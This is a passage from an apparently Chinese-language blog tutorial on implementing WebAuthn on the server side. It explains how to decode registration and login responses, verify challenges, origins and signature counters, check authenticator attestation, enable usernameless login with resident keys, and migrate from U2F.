\"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a 